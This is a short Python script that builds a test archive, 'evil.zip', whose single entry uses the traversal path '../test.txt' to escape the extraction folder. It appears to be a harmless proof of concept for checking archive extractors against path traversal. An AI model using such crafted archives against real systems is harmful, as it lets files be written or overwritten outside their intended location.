import zipfile

zip_filename = 'evil.zip'

with zipfile.ZipFile(zip_filename, 'w') as zipf:
    zipf.writestr('../test.txt', 'Test content for the malicious file.')
    
print(f"ZIP file created: {zip_filename}")
